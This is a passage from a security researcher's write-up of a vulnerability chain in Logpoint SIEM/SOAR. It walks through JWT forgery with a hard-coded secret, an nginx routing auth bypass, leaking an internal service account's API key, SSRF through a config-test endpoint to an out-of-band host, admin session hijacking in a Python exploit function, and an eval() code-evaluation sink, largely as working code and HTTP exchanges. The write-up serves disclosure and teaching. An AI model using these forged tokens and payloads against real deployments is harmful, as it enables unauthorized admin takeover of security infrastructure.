<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>import</span><span> io.jsonwebtoken.Jwts;</span></span>
<span><span>import</span><span> io.jsonwebtoken.SignatureAlgorithm;</span></span>
<span><span>import</span><span> io.jsonwebtoken.impl.TextCodec;</span></span>
<span><span>import</span><span> io.jsonwebtoken.JwtBuilder;</span></span>
<span><span>import</span><span> io.jsonwebtoken.Claims;</span></span>
<span><span>import</span><span> io.jsonwebtoken.ExpiredJwtException;</span></span>
<span><span>import</span><span> io.jsonwebtoken.MalformedJwtException;</span></span>
<span><span>import</span><span> io.jsonwebtoken.SignatureException;</span></span>
<span></span>
<span><span>import</span><span> java.util.Date;</span></span>
<span></span>
<span><span>public</span><span> </span><span>class</span><span> </span><span>Main</span><span> {</span></span>
<span><span>    </span><span>public</span><span> </span><span>static</span><span> </span><span>void</span><span> </span><span>main</span><span>(</span><span>String</span><span>[] </span><span>args</span><span>) {</span></span>
<span><span>        System.out.</span><span>println</span><span>(</span><span>&#34;Hello world!&#34;</span><span>);</span></span>
<span><span>        </span><span>final</span><span> JwtBuilder</span><span> </span><span>jwtBuilder</span><span> </span><span>=</span><span> Jwts.</span><span>builder</span><span>().</span><span>setSubject</span><span>(</span><span>&#34;admin&#34;</span><span>)</span></span>
<span><span>                .</span><span>claim</span><span>(</span><span>&#34;username&#34;</span><span>, (Object) </span><span>&#34;admin&#34;</span><span>)</span></span>
<span><span>                .</span><span>claim</span><span>(</span><span>&#34;role&#34;</span><span>, (Object) </span><span>&#34;SUPER&#34;</span><span>)</span></span>
<span><span>                .</span><span>claim</span><span>(</span><span>&#34;token_type&#34;</span><span>, (Object) </span><span>&#34;AUTH&#34;</span><span>).</span></span>
<span><span>                </span><span>setIssuedAt</span><span>(</span><span>new</span><span> </span><span>Date</span><span>(System.</span><span>currentTimeMillis</span><span>())).</span><span>signWith</span><span>(SignatureAlgorithm.HS256, TextCodec.BASE64.</span><span>decode</span><span>(</span><span>&#34;WW4wbWRGQVdjd0ZsTDhXWFNUQXJDQ0JvVEdzPQ==&#34;</span><span>));</span></span>
<span><span>        System.out.</span><span>println</span><span>(jwtBuilder.</span><span>compact</span><span>());</span></span>
<span><span>    }</span></span>
<span><span>}</span></span></code></pre></div>



<p>Note that an â€œadminâ€ username is created by default on all Logpoint instances. Once you build and run the above code, you will have the following magic token.</p>



<figure><p><strong>Magic JWT Token :<br/></strong>eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiU1VQRVIiLCJ0b2tlbl90eXBlIjoiQVVUSCIsImlhdCI6MTcxODcwNzI4OH0.EBgc_BGubwbLH-91M4rFnd0BguvTAJHod1YObw5fqJc</p></figure>



<p>I hit the <code>/soar/sso/v1/user/auth/apikey</code> endpoint. And once again, the goal is to reach it from the external network. To do that, I simply prepend <code>/soar/sso</code> to the path, which tells the first Nginx instance to route the request straight to the login microservice.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>// HTTP REQUEST TO THE FIRST NGINX FROM THE OUTSIDE WORLD</span></span>
<span></span>
<span><span>GET /soar/sso/v1/user/auth/apikey HTTP/2</span></span>
<span><span>Host: 192.168.179.136</span></span>
<span><span>secbi_auth_token:eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhb2glbmlsInVzZXJuYW1lIjoidWRtaW4iLCJyb2xlIjoiQVRNIiwiZXhwIjoxNzAxMTM2MDcsImlhdCI6MTcwMTEzMjA3fQ.1COlbZflJq0eXBlHj01QWVSClmhDCN6tXODcwNVt40HO.E8bc_BGubwbLH-S1M4rFndObqvVTAJHodIYOb5GJqC</span></span>
<span><span>Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;125&#34;, &#34;Not.A/Brand&#34;;v=&#34;24&#34;</span></span>
<span><span>Accept: application/json</span></span>
<span><span>Sec-Ch-Ua-Mobile: ?0</span></span>
<span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36</span></span>
<span><span>Sec-Ch-Ua-Platform: &#34;Windows&#34;</span></span>
<span><span>Sec-Fetch-Site: same-origin</span></span>
<span><span>Sec-Fetch-Mode: cors</span></span>
<span><span>Sec-Fetch-Dest: empty</span></span>
<span><span>Referer: https://192.168.179.136/soar/automation/playbooks</span></span>
<span><span>Accept-Encoding: gzip, deflate, br</span></span>
<span><span>Accept-Language: en-US,en;q=0.9</span></span>
<span><span>Priority: u=1, i</span></span>
<span></span>
<span></span>
<span></span>
<span><span>// RESPONSE</span></span>
<span><span>HTTP/2 200 OK</span></span>
<span><span>Server: nginx</span></span>
<span><span>Date: Tue, 18 Jun 2024 10:44:11 GMT</span></span>
<span><span>Content-Type: application/json</span></span>
<span><span>Vary: Accept-Encoding</span></span>
<span><span>Access-Control-Allow-Origin: *</span></span>
<span><span>Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE</span></span>
<span><span>Access-Control-Allow-Headers: DNT, User-Agent, X-Requested-With, If-Modified-Since, Cache-Control, Content-Type, Range</span></span>
<span><span>Access-Control-Expose-Headers: Content-Length, Content-Range</span></span>
<span><span>X-Frame-Options: SAMEORIGIN</span></span>
<span><span>X-XSS-Protection: 1; mode=block</span></span>
<span><span>X-Content-Type-Options: nosniff</span></span>
<span><span>Content-Security-Policy: default-src &#39;self&#39;; child-src &#39;self&#39; blob:;</span></span>
<span><span>    script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;</span></span>
<span><span>    style-src &#39;self&#39; &#39;unsafe-inline&#39;;</span></span>
<span><span>    img-src &#39;self&#39; data: blob:;</span></span>
<span><span>    report-uri /content_policy_violation;</span></span>
<span><span>    font-src &#39;self&#39; data:;</span></span>
<span><span>    worker-src blob:;</span></span>
<span><span>Cache-Control: max-age=0, no-cache, no-store, must-revalidate</span></span>
<span><span>Pragma: no-cache</span></span>
<span><span>Strict-Transport-Security: max-age=15768000</span></span>
<span></span>
<span><span>[</span></span>
<span><span>  {</span></span>
<span><span>    &#34;apiKey&#34;: &#34;2LRnxYx1BwZrJ5FJRpMrMdEaTwbqaLar8RpnAGi2jxwM1g_nGq-gNTxPCdUNL-t4eCMjqPSwPvNOFQElgAz3nhbUzcHOPC-mwEUHpcj-PRKRFNTLDIC16Ty7EJg&#34;,</span></span>
<span><span>    &#34;apiSecret&#34;: &#34;XzRvV2V0gSBltEjdvwrGSQ==&#34;</span></span>
<span><span>  }</span></span>
<span><span>]</span></span></code></pre></div>



<p>That is exciting, but it immediately raises another question. What exactly is this <code>apiKey</code> in the response, and why does it look completely different from the JWT token I am already using? Once again, the answer is clearly hiding in the code.</p>



<h3>Bug 3: Escalating privileges to the Hidden internal SOAR User</h3>



<p>As the method name suggests, <code>/v1/user/auth/apikey</code> maps to <code>getAllApiCredentials()</code>, which returns the API credentials stored on the Java side. The response is an array, but it contains only a single <code>apiKey</code> and <code>apiSecret</code>.</p>



<p>It looks like these credentials belong to my admin account and are used internally between SOAR services. The JWT gets me in, but inside the system, authentication shifts to this API key model.</p>



<p>That leads to the obvious next question. If I now have an API key, is there an endpoint that accepts it and tells me who I am? I copied the newly leaked <code>apiKey</code> and send the following request.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>GET /soar/sso/v1/user/apikey HTTP/2</span></span>
<span><span>Host: 192.168.179.136</span></span>
<span><span>Secbi_api_key: 2IBwnxkulBv7I5EJpnMvKdEaIwbqaLsAr8BpAGij2jXmWsD_vv6q-gWTXpCdUNl-t4eCMjqPSwPvNOFqElgAz3nhbUzcHOPC-mwEUHpcj-PRKRFNTLDIC16Ty7EJg</span></span>
<span><span>Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;125&#34;, &#34;Not.A/Brand&#34;;v=&#34;24&#34;</span></span>
<span><span>Accept: application/json</span></span></code></pre></div>



<p>Our new endpoint that actually tells me who I am ? is quite similar to the one Iâ€™ve just used. </p>



<ul>
<li>Our new API that takes <code>Secbi_api_key </code>header is <code>sso/v1/user/apikey</code>.</li>



<li>Our previously used one takes <code>secbi_auth_token </code>header and returns all the API tokens is <code>sso/v1/user/auth/apikey</code></li>
</ul>



<p>Yes, I was confused too. Security through obscurity almost worked. Almost.</p>



<p>The username is <code>secbi</code>.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>HTTP/2 200 OK</span></span>
<span><span>Server: nginx</span></span>
<span><span>Date: Tue, 18 Jun 2024 11:24:34 GMT</span></span>
<span><span>... OMITTED HEADERS ...</span></span>
<span><span>Strict-Transport-Security: max-age=15768000</span></span>
<span></span>
<span><span>{</span></span>
<span><span>  &#34;username&#34;: &#34;secbi&#34;,</span></span>
<span><span>  &#34;password&#34;: null,</span></span>
<span><span>  &#34;role&#34;: 0,</span></span>
<span><span>  &#34;tokenStrategy&#34;: null</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>It turns out this is not a regular user at all. <code>secbi</code> is an internal, highest-privilege SOAR account that comes bundled with the installation and is used exclusively for microservice-to-microservice communication. </p>



<figure><blockquote><p>Chaining these 3 bugs, we can hit every single endpoint in the Java microservice component of Logpoint! </p></blockquote></figure>



<h2>Critical Thinking: Where to proceed from now on? </h2>



<p>Chaining issues in the Java microservices clearly expands the attack surface, but it also has a ceiling. Even a full compromise there leaves me inside a container. That is not the endgame.</p>



<p>So I shift focus. None of the tokens or API keys apply to the Python backend that runs on the operating system itself, but that raises a far more interesting question. What if I can add more bugs to the chain that lets me initiate an admin session directly on the Python side?</p>



<p>That is where the real fun begins.</p>



<h2>Bug 4: Server-Side Request Forgery leads to Authentication Bypass on LogPoint Python Backend</h2>



<p>I was thinking about what type of a â€œbugâ€ I need to add to the chain while I was going through my notes, and I saw the following log!</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>LOGPOINT API call:</span></span>
<span><span>Method: GET</span></span>
<span><span>URL: http://127.0.0.1:18000/User/preference</span></span>
<span><span>cookie: class Cookie {</span></span>
<span><span>  key: session</span></span>
<span><span>  value: INVALIDCOOKIE</span></span>
<span><span>}</span></span></code></pre></div>



<p>That immediately brings me back to the service listening on <code>localhost:18000</code>, accessible only from within the appliance. Until now, I had never bothered to read that part of the code. There was simply no reason to.</p>



<p>But now there is. If something exploitable lives there, I do not need direct access. I can pivot back to the Java side and look for an SSRF to reach it. And since the request would originate from localhost, access controls would not stand in the way at all.</p>



<p>At that point, the path forward becomes very clear. And Iâ€™ve found something that I can actually use! </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>@app.route</span><span>(</span><span>&#34;/private/user_access_key&#34;</span><span>, </span><span>methods</span><span>=</span><span>[</span><span>&#34;GET&#34;</span><span>])</span></span>
<span><span>def</span><span> </span><span>secret_fetch</span><span>():</span></span>
<span><span>    </span><span>&#34;&#34;&#34;</span></span>
<span><span>    An internal API exposed for inter-application data transmission.</span></span>
<span><span>    reads the admin user&#39;s access key (secret_key) from the database and sends it to the requester.</span></span>
<span><span>    &#34;&#34;&#34;</span></span>
<span><span>    secret_key </span><span>=</span><span> </span><span>None</span></span>
<span><span>    admin_user </span><span>=</span><span> </span><span>dict</span><span>()</span></span>
<span><span>    pipelines </span><span>=</span><span> [</span></span>
<span><span>        {</span></span>
<span><span>            </span><span>&#34;$match&#34;</span><span>: {</span><span>&#34;active&#34;</span><span>: </span><span>True</span><span>},</span></span>
<span><span>        },</span></span>
<span><span>        {</span></span>
<span><span>            </span><span>&#34;$project&#34;</span><span>: {</span></span>
<span><span>                </span><span>&#34;username&#34;</span><span>: </span><span>1</span><span>,</span></span>
<span><span>                </span><span>&#34;secret_key&#34;</span><span>: </span><span>1</span><span>,</span></span>
<span><span>                </span><span>&#34;usergroup_fk&#34;</span><span>: {</span></span>
<span><span>                    </span><span>&#34;$map&#34;</span><span>: {</span></span>
<span><span>                        </span><span>&#34;input&#34;</span><span>: {</span></span>
<span><span>                            </span><span>&#34;$map&#34;</span><span>: {</span></span>
<span><span>                                </span><span>&#34;input&#34;</span><span>: </span><span>&#34;$usergroup&#34;</span><span>,</span></span>
<span><span>                                </span><span>&#34;in&#34;</span><span>: {</span></span>
<span><span>                                    </span><span>&#34;$arrayElemAt&#34;</span><span>: [{</span><span>&#34;$objectToArray&#34;</span><span>: </span><span>&#34;$$this&#34;</span><span>}, </span><span>1</span><span>]</span></span>
<span><span>                                },</span></span>
<span><span>                            }</span></span>
<span><span>                        },</span></span>
<span><span>                        </span><span>&#34;in&#34;</span><span>: </span><span>&#34;$$this.v&#34;</span><span>}},</span></span>
<span><span>            }</span></span>
<span><span>        },</span></span>
<span><span>        {</span></span>
<span><span>            </span><span>&#34;$lookup&#34;</span><span>: {</span></span>
<span><span>                </span><span>&#34;from&#34;</span><span>: </span><span>&#34;usergroup&#34;</span><span>,</span></span>
<span><span>                </span><span>&#34;localField&#34;</span><span>: </span><span>&#34;usergroup_fk&#34;</span><span>,</span></span>
<span><span>                </span><span>&#34;foreignField&#34;</span><span>: </span><span>&#34;_id&#34;</span><span>,</span></span>
<span><span>                </span><span>&#34;as&#34;</span><span>: </span><span>&#34;usergrps&#34;</span></span>
<span><span>            }</span></span>
<span><span>        },</span></span>
<span><span>        {</span><span>&#34;$unwind&#34;</span><span>: </span><span>&#39;$usergrps&#39;</span><span>},</span></span>
<span><span>        {</span><span>&#39;$match&#39;</span><span>:</span></span>
<span><span>         {</span><span>&#39;usergrps.lpadmin&#39;</span><span>: </span><span>True</span><span>}},</span></span>
<span></span>
<span><span>    ]</span></span>
<span></span>
<span><span>    admin_user </span><span>=</span><span> dboperation.aggregation_pipe(</span><span>&#39;user&#39;</span><span>, pipelines)</span></span>
<span></span>
<span><span>    </span><span>if</span><span> admin_user:</span></span>
<span><span>        admin_user </span><span>=</span><span> admin_user[</span><span>0</span><span>]</span></span>
<span><span>        secret_key </span><span>=</span><span> admin_user.get(</span><span>&#34;secret_key&#34;</span><span>)</span></span>
<span><span>    </span><span>else</span><span>:</span></span>
<span><span>        logging.critical(</span></span>
<span><span>            </span><span>&#34;search api; requested; type=audit_log; msg=active admin user not found; source_address=</span><span>%s</span><span>&#34;</span></span>
<span><span>            </span><span>%</span><span> request.remote_addr</span></span>
<span><span>        )</span></span>
<span><span>        </span><span>return</span><span> jsonify({</span><span>&#34;success&#34;</span><span>: </span><span>False</span><span>, </span><span>&#34;message&#34;</span><span>: </span><span>&#34;Active admin user not found.&#34;</span><span>})</span></span>
<span></span>
<span><span>    </span><span>return</span><span> jsonify({</span><span>&#34;success&#34;</span><span>: </span><span>bool</span><span>(secret_key),</span></span>
<span><span>                       </span><span>&#34;username&#34;</span><span>: admin_user.get(</span><span>&#39;username&#39;</span><span>, </span><span>None</span><span>), </span><span>&#34;secret_key&#34;</span><span>: secret_key})</span></span></code></pre></div>



<p>The above endpoint simply returns the <code>secret_key</code> of the <mark>admin </mark>user! But hold your horses, I have even more questions now. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>root</span><span>@</span><span>logpoint:</span><span>~</span><span> curl http:</span><span>//</span><span>127.0</span><span>.0.1:</span><span>18000</span><span>/</span><span>private</span><span>/</span><span>user_access_key</span></span>
<span><span>{</span></span>
<span><span>  </span><span>&#34;secret_key&#34;</span><span>: </span><span>&#34;9930cb348f02c7114f7f1206fa964595&#34;</span><span>,</span></span>
<span><span>  </span><span>&#34;success&#34;</span><span>: true,</span></span>
<span><span>  </span><span>&#34;username&#34;</span><span>: </span><span>&#34;admin&#34;</span></span>
<span><span>}</span></span></code></pre></div>



<p>This internal API exists as a bridge between the Java SOAR services and the legacy Python backend, allowing them to communicate when new Docker based features are added to an older core platform. From an attackerâ€™s perspective, it is a perfect SSRF target. But it is not a normal public endpoint. Only a small set of internal APIs accept <code>secrets </code>and return data, all designed strictly for microservice use.</p>



<figure><blockquote><p><strong>How can I take an advantage of this key to initiate new session cookie on the Python side ?Â </strong></p></blockquote></figure>



<p>Further reading of the Python code base showed me an interesting if-else statement on the <code>/initapp</code> endpoint. Sending a simple HTTP POST request with a valid username and secret_key is enough to initiate a valid session and retrieve a COOKIE.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>def</span><span> </span><span>initiate_admin_session</span><span>(lp_user_dict):</span></span>
<span><span>    </span><span>global</span><span> </span><span>TARGET</span><span>, cookies</span></span>
<span></span>
<span><span>    </span><span>print</span><span>(</span><span>&#34;[+] Going to abuse /initapp on LogPoint-SIEM Backend to assign our user to the session..!&#34;</span><span>)</span></span>
<span></span>
<span><span>    payload </span><span>=</span><span> {</span></span>
<span><span>        </span><span>&#39;user&#39;</span><span>: </span><span>&#39;admin&#39;</span><span>,</span></span>
<span><span>        </span><span>&#39;secret&#39;</span><span>: </span><span>&#34;9930cb348f02c7114f7f1206fa964595&#39;,</span></span>
<span><span>        </span><span>&#39;CSRFToken&#39;</span><span>: </span><span>&#39;undefined&#39;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    r </span><span>=</span><span> requests.post(</span><span>TARGET</span><span> </span><span>+</span><span> </span><span>&#39;/initapp&#39;</span><span>,</span><span>data</span><span>=</span><span>payload, </span><span>verify</span><span>=</span><span>False</span><span>)</span></span>
<span><span>    </span><span>if</span><span> r.cookies:</span></span>
<span><span>        </span><span>print</span><span>(</span><span>&#34;[+] Successfully initiated the admin session ournew cookie : &#34;</span><span> </span><span>+</span><span> </span><span>str</span><span>(r.cookies))</span></span>
<span><span>        cookies </span><span>=</span><span> r.cookies</span></span>
<span><span>    </span><span>else</span><span>:</span></span>
<span><span>        </span><span>print</span><span>(</span><span>&#34;[-] Awkward..! Could not initiate the admin session&#34;</span><span>)</span></span>
<span><span>        </span><span>print</span><span>(r.text)</span></span>
<span><span>        </span><span>exit</span><span>(</span><span>1</span><span>)</span></span></code></pre></div>



<p>Iâ€™m ready to hunt an SSRF in the Java layer! This is my final pass through this containerized LogPoint microservice.</p>



<p>Up to this point, I was still inside a container. That boundary was about to disappear.</p>



<h3>Root cause analysis of the ConfigTest SSRF</h3>



<p>Finding the right candidates and knowing where to look in the codebase turns out to be fairly easy with simple IDE searches. I also use Semgrep to speed things up, but the details of that process are not important here.</p>



<p>When a request is sent to <code>/soar/api/v1/soar-sources/config/test/run</code>, it is routed to an internal docker container named <strong>api-service</strong>. The controller method is implemented at <code>api/soar/sources/SoarSourcesApi.java</code>.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>@</span><span>Override</span></span>
<span><span>public</span><span> ResponseEntity</span><span>&lt;</span><span>ActionResult</span><span>&gt;</span><span> </span><span>testSourceConfig</span><span>(</span></span>
<span><span>    @</span><span>ApiParam</span><span>(</span><span>value</span><span> </span><span>=</span><span> </span><span>&#34;a full source with additional params&#34;</span><span>, </span><span>required</span><span> </span><span>=</span><span> </span><span>true</span><span>)</span></span>
<span><span>    @</span><span>Valid</span><span> @</span><span>RequestBody</span><span> </span><span>final</span><span> SourceConfigTestContext sourceConfigTestContext</span></span>
<span><span>) {</span></span>
<span></span>
<span><span>    </span><span>final</span><span> SourceConfig</span><span> </span><span>sourceConfig</span><span> </span><span>=</span><span> sourceConfigTestContext.</span><span>getSourceConfig</span><span>();</span></span>
<span></span>
<span><span>    </span><span>final</span><span> </span><span>long</span><span> </span><span>timeIntervalMinutes</span><span> </span><span>=</span><span> sourceConfigTestContext.</span><span>getTimeIntervalMinutes</span><span>();</span></span>
<span></span>
<span><span>    </span><span>final</span><span> PullResultContext</span><span> </span><span>result</span><span> </span><span>=</span><span> </span><span>this</span><span>.pullerTestExecutor.</span><span>pullTest</span><span>(</span></span>
<span><span>            sourceConfig,</span></span>
<span><span>            timeIntervalMinutes</span></span>
<span><span>        );</span></span>
<span></span>
<span><span>    </span><span>final</span><span> ActionResult</span><span> </span><span>actionResult</span><span> </span><span>=</span><span> </span><span>new</span><span> </span><span>ActionResult</span><span>();</span></span>
<span><span>    actionResult.</span><span>setId</span><span>(sourceConfig.</span><span>getUuid</span><span>());</span></span>
<span><span>    actionResult.</span><span>setName</span><span>(sourceConfig.</span><span>getSourceName</span><span>());</span></span>
<span><span>    actionResult.</span><span>setStatusCode</span><span>(</span></span>
<span><span>        String.</span><span>valueOf</span><span>(result.</span><span>getStatusCode</span><span>())</span></span>
<span><span>    );</span></span>
<span></span>
<span><span>    ActionUtils.</span><span>populateActionResultHttpRequestResponseStr</span><span>(</span></span>
<span><span>        actionResult,</span></span>
<span><span>        result.</span><span>getHttpRequest</span><span>(),</span></span>
<span><span>        result.</span><span>getResponse</span><span>(),</span></span>
<span><span>        result.</span><span>getRawResponseBody</span><span>()</span></span>
<span><span>    );</span></span>
<span></span>
<span><span>    actionResult.</span><span>setRawResponse</span><span>(result.</span><span>getRawErrorResponse</span><span>());</span></span>
<span></span>
<span><span>    </span><span>return</span><span> (ResponseEntity</span><span>&lt;</span><span>ActionResult</span><span>&gt;</span><span>)</span></span>
<span><span>        </span><span>new</span><span> </span><span>ResponseEntity</span><span>(</span></span>
<span><span>            (Object) actionResult,</span></span>
<span><span>            HttpStatus.OK</span></span>
<span><span>        );</span></span>
<span><span>}</span></span></code></pre></div>



<p>The above code is pretty straightforward. JSON body of the request is send to the <code>pullTest()</code></p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> PullResultContext </span><span>pullTest</span><span>(SourceConfig sourceConfig, Long timeIntervalMinutes) {</span></span>
<span><span>    PullResultContext</span><span> </span><span>pullResultContext;</span></span>
<span><span>    </span><span>try</span><span> {</span></span>
<span><span>        SourceConfig</span><span> </span><span>encryptSourceConfig</span><span> </span><span>=</span></span>
<span><span>            DispatcherCommonUtils.</span><span>encryptExecutionParameters</span><span>(</span><span>this</span><span>.incidentsSourceDao, sourceConfig);</span></span>
<span><span>        Puller</span><span> </span><span>puller</span><span> </span><span>=</span><span> PullerFactory.</span><span>get</span><span>(</span><span>this</span><span>.configuration, encryptSourceConfig);</span></span>
<span><span>        puller.</span><span>init</span><span>();</span></span>
<span></span>
<span><span>        </span><span>long</span><span> </span><span>nowSeconds</span><span> </span><span>=</span><span> Instant.</span><span>now</span><span>().</span><span>getEpochSecond</span><span>();</span></span>
<span><span>        </span><span>long</span><span> </span><span>slidingWindowSeconds</span><span> </span><span>=</span><span> TimeUnit.MINUTES.</span><span>toSeconds</span><span>(timeIntervalMinutes);</span></span>
<span><span>        </span><span>long</span><span> </span><span>startNewLogPullTimeSeconds</span><span> </span><span>=</span><span> nowSeconds </span><span>-</span><span> slidingWindowSeconds;</span></span>
<span></span>
<span><span>        pullResultContext </span><span>=</span><span> puller.</span><span>execute</span><span>(</span></span>
<span><span>            encryptSourceConfig,</span></span>
<span><span>            startNewLogPullTimeSeconds,</span></span>
<span><span>            nowSeconds,</span></span>
<span><span>            encryptSourceConfig.</span><span>getTzCode</span><span>()</span></span>
<span><span>        );</span></span>
<span><span>    } </span><span>catch</span><span> (Exception </span><span>e</span><span>) {</span></span>
<span><span>        pullResultContext </span><span>=</span><span> </span><span>new</span><span> </span><span>PullResultContext</span><span>();</span></span>
<span><span>        pullResultContext.</span><span>setStatusCode</span><span>(</span><span>500</span><span>);</span></span>
<span><span>        Throwable</span><span> </span><span>cause</span><span> </span><span>=</span><span> e.</span><span>getCause</span><span>();</span></span>
<span><span>        pullResultContext.</span><span>setRawErrorResponse</span><span>(</span></span>
<span><span>            cause </span><span>!=</span><span> </span><span>null</span><span> </span><span>?</span><span> cause.</span><span>toString</span><span>() </span><span>:</span><span> e.</span><span>getMessage</span><span>()</span></span>
<span><span>        );</span></span>
<span><span>    }</span></span>
<span><span>    </span><span>return</span><span> pullResultContext;</span></span>
<span><span>}</span></span></code></pre></div>



<p>When I have a look at the <code>sourceConfig</code> class to understand the JSON data structer, because its populated from the HTTP body on the controller method, I didnâ€™t even need to read the <code>puller.execute()</code> at all.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>{</span></span>
<span><span>  </span><span>&#34;sourceConfig&#34;</span><span>: {</span></span>
<span><span>    </span><span>&#34;uuid&#34;</span><span>: </span><span>&#34;a22aa4d1-2df2-4b8a-9aba-cf5087bc01d9&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;description&#34;</span><span>: </span><span>&#34;Local Logpoint-SIEM instance&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;enabled&#34;</span><span>: </span><span>true</span><span>,</span></span>
<span><span>    </span><span>&#34;executionParams&#34;</span><span>: {</span></span>
<span><span>      </span><span>&#34;logpointSiemMachineIp&#34;</span><span>: </span><span>&#34;xrsbfpeerdfulurvi24lssvvm2dq4nsc.oastify.com:80/?asd=&#34;</span><span>,</span></span>
<span><span>      </span><span>&#34;logpointPrivateApiSchema&#34;</span><span>: </span><span>&#34;http&#34;</span><span>,</span></span>
<span><span>      </span><span>&#34;logpointPrivateApiPort&#34;</span><span>: </span><span>&#34;80&#34;</span><span>,</span></span>
<span><span>      </span><span>&#34;logpointIncidentsApiPath&#34;</span><span>: </span><span>&#34;/incidents&#34;</span><span>,</span></span>
<span><span>      </span><span>&#34;enforceCredentialsFromFile&#34;</span><span>: </span><span>false</span><span>,</span></span>
<span><span>      </span><span>&#34;logpointPullIncidentsUserName&#34;</span><span>: </span><span>&#34;&#34;</span><span>,</span></span>
<span><span>      </span><span>&#34;logpointPullIncidentsAccessKey&#34;</span><span>: </span><span>&#34;&#34;</span></span>
<span><span>    },</span></span>
<span><span>    </span><span>&#34;filters&#34;</span><span>: </span><span>null</span><span>,</span></span>
<span><span>    </span><span>&#34;idFieldName&#34;</span><span>: </span><span>&#34;incident_id&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;sourceType&#34;</span><span>: </span><span>&#34;LOGPOINT&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;tzCode&#34;</span><span>: </span><span>&#34;UTC&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;sourceName&#34;</span><span>: </span><span>&#34;Logpoint-SIEM&#34;</span></span>
<span><span>  },</span></span>
<span><span>  </span><span>&#34;timeIntervalMinutes&#34;</span><span>: </span><span>1</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>The implementation simply concatenates the scheme, machine IP, port, and path. There is no validation on any of these fields. By appending a query string to <code>logpointSiemMachineIp</code>, everything that follows including the path and port is treated as part of the query.</p>







<p>That changes everything. With this in place, I can force the application to issue a GET request to any URL I choose.</p>



<blockquote>
<p><em>Bonus tip: I append <code>?asd=</code> to the end because the runner tends to concatenate extra path/port fragments onto our input/host. By starting a query string early, anything it appends later is treated as part of the <strong>query parameter</strong>, not the actual host/path</em></p>
</blockquote>



<p>The only missing piece is a valid <code>uuid</code> for the first parameter, which turns out to be easy to obtain from the <code>/soar/api/v1/soar-sources/config</code> endpoint itself! </p>



<h2>Recap of the chaining of 4 bugs</h2>



<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511cc190&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511cc190"><img loading="lazy" decoding="async" width="1024" height="687" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/attack-chain-first-half-1024x687.jpeg" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/attack-chain-first-half-1024x687.jpeg 1024w, https://mehmetince.net/wp-content/uploads/2025/12/attack-chain-first-half-300x201.jpeg 300w, https://mehmetince.net/wp-content/uploads/2025/12/attack-chain-first-half-768x515.jpeg 768w, https://mehmetince.net/wp-content/uploads/2025/12/attack-chain-first-half.jpeg 1264w" sizes="auto, (max-width: 1024px) 100vw, 1024px"/></figure>



<p>Now there is only one thing left to do. Find a code execution bug in the Python backend. And, as it turns out, that opens up yet another rabbit hole waiting to be explored.</p>



<h2>Bug 5 â€“ Authenticated Code Evaluation Vulnerability on Python-Backend</h2>



<p>At this point, the task becomes surprisingly simple. I no longer need to read the entire codebase. Instead, I narrow my focus and start hunting for sinks, the places where potentially dangerous functions are used and where a small mistake could turn into something much bigger.<br/></p>



<p>Iâ€™ve found the following code section, and it already indicates this is related to the rule engine. But since the operators are all comparison operators, there is no way these <code>left</code> and <code>right </code>parameters are validated before reaching here, right? </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>class</span><span> </span><span>_Condition</span><span>:</span></span>
<span></span>
<span><span>    </span><span>@</span><span>classmethod</span></span>
<span><span>    </span><span>def</span><span> </span><span>evaluate</span><span>(cls, left, right, operator):</span></span>
<span><span>        </span><span>if</span><span> operator </span><span>in</span><span> (</span><span>&#39;&lt;&#39;</span><span>, </span><span>&#39;&gt;&#39;</span><span>, </span><span>&#39;&lt;=&#39;</span><span>, </span><span>&#39;&gt;=&#39;</span><span>, </span><span>&#39;==&#39;</span><span>, </span><span>&#39;!=&#39;</span><span>):</span></span>
<span><span>            </span><span>return</span><span> </span><span>eval</span><span>(</span><span>str</span><span>(left) </span><span>+</span><span> </span><span>str</span><span>(operator) </span><span>+</span><span> </span><span>str</span><span>(right))</span></span></code></pre></div>



